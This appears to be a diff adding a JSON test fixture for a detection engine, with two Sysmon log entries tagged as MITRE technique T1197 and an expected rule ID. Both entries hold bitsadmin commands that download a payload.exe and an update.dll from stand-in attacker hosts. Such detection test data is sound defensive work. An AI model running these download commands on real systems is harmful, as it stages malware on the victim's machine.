@@ -1,0 +1,14 @@
+[
+  {
+    "raw": "2026-09-17 11:05:12 PID:5123 TID:4421 \"C:\\Windows\\System32\\bitsadmin.exe\" /transfer eviljob /download /priority high http://attacker.com/payload.exe C:\\Users\\public\\payload.exe",
+    "source": "sysmon",
+    "technique_id": "T1197",
+    "expected_rules": ["f6a7b8c9-d0e1-2345-fabc-678901234567"]
+  },
+  {
+    "raw": "2026-09-17 11:12:33 PID:4987 TID:3312 \"C:\\Windows\\System32\\bitsadmin.exe\" /transfer malware_stage2 http://c2server.net/bin/update.dll C:\\temp\\update.dll",
+    "source": "sysmon",
+    "technique_id": "T1197",
+    "expected_rules": ["f6a7b8c9-d0e1-2345-fabc-678901234567"]
+  }
+]
